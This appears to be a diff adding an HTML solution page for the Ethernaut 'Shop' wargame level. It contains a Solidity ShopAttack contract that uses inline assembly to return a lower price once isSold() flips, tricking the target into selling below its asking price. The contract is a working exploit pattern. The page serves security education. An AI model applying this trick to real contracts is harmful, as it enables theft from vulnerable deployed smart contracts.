@@ -1,0 +1,71 @@
+<!DOCTYPE html>
+
+<html>
+<head>
+  <title>Ethernaut 21: Shop</title>
+  <meta http-equiv="content-type" content="text/html; charset=UTF-8">
+  <link rel="stylesheet" media="all" href="../public/stylesheets/normalize.css" />
+  <link rel="stylesheet" media="all" href="../docco.css" />
+</head>
+<body>
+  <div class="container">
+    <div class="page">
+
+      <div class="header">
+        <h1>Ethernaut 21: Shop</h1>
+
+        
+      </div>
+      
+        
+        <p>Since the Istanbul fork <a href="https://eips.ethereum.org/EIPS/eip-1884">repriced the SLOAD instruction from 200 to 800 gas</a>,
+solutions that implement below attack without using assembly to shave off a few units of gas
+fail to execute it within the allowance of 3000 gas. (See discussion <a href="https://github.com/OpenZeppelin/ethernaut/issues/156#issuecomment-609374838">here</a>.)</p>
+<p>In particular, what we’re doing here to execute within the limit:</p>
+<ul>
+<li>not loading <code>Shop</code> instance address from storage</li>
+<li>handling ‘call data routing’ ourselves</li>
+<li>implementing <code>if (shop.isSold()) { return 1; } else { return 100; }</code> in assembly to get rid of boilerplate</li>
+</ul>
+
+        <div class='highlight'><pre><span class="hljs-meta"><span class="hljs-keyword">pragma</span> <span class="hljs-keyword">solidity</span> ^0.6.0;</span>
+
+<span class="hljs-keyword">import</span> <span class="hljs-string">&quot;./21_Shop.sol&quot;</span>;
+
+<span class="hljs-class"><span class="hljs-keyword">contract</span> <span class="hljs-title">ShopAttack</span> </span>{
+    <span class="hljs-function"><span class="hljs-keyword">fallback</span> (<span class="hljs-params"></span>) <span class="hljs-title"><span class="hljs-keyword">external</span></span> </span>{
+        Shop shop = Shop(<span class="hljs-number">0x708fA82359E24DB720C75f9b4D202Ad12D0E45Be</span>);</pre></div>
+      
+        
+        <p>Call without call data issues <code>Shop.buy</code>.</p>
+
+        <div class='highlight'><pre>        <span class="hljs-keyword">if</span> (<span class="hljs-built_in">msg</span>.<span class="hljs-built_in">data</span>.<span class="hljs-built_in">length</span> == <span class="hljs-number">0</span>) {
+            shop.buy.<span class="hljs-built_in">gas</span>(<span class="hljs-number">100000</span>)();
+        }</pre></div>
+      
+        
+        <p>Any other call data is interpreted as calling <code>price()</code>.</p>
+
+        <div class='highlight'><pre>        <span class="hljs-keyword">else</span> {
+            <span class="hljs-keyword">assembly</span> {
+                <span class="hljs-comment">/* &#x27;isSold()&#x27; signature */</span>
+                <span class="hljs-built_in">mstore</span>(<span class="hljs-number">0</span>, <span class="hljs-number">0xe852e74100000000000000000000000000000000000000000000000000000000</span>)
+                <span class="hljs-keyword">let</span> result := <span class="hljs-built_in">staticcall</span>(
+                    <span class="hljs-number">3000</span>,   <span class="hljs-comment">// gas</span>
+                    shop,   <span class="hljs-comment">// address</span>
+                    <span class="hljs-number">0</span>,      <span class="hljs-comment">// input ptr</span>
+                    <span class="hljs-number">4</span>,      <span class="hljs-comment">// input size</span>
+                    <span class="hljs-number">0</span>,      <span class="hljs-comment">// output ptr</span>
+                    <span class="hljs-number">32</span>      <span class="hljs-comment">// output size</span>
+                )
+                <span class="hljs-keyword">switch</span> <span class="hljs-built_in">mload</span>(<span class="hljs-number">0</span>) <span class="hljs-keyword">case</span> <span class="hljs-number">0</span> { <span class="hljs-built_in">mstore</span>(<span class="hljs-number">0</span>, <span class="hljs-number">100</span>) } <span class="hljs-keyword">default</span> { <span class="hljs-built_in">mstore</span>(<span class="hljs-number">0</span>, <span class="hljs-number">1</span>) }
+                <span class="hljs-keyword">return</span>(<span class="hljs-number">0</span>, <span class="hljs-number">32</span>)
+            }
+        }
+    }
+}</pre></div>
+      
+    </div>
+  </div>
+</body>
+</html>
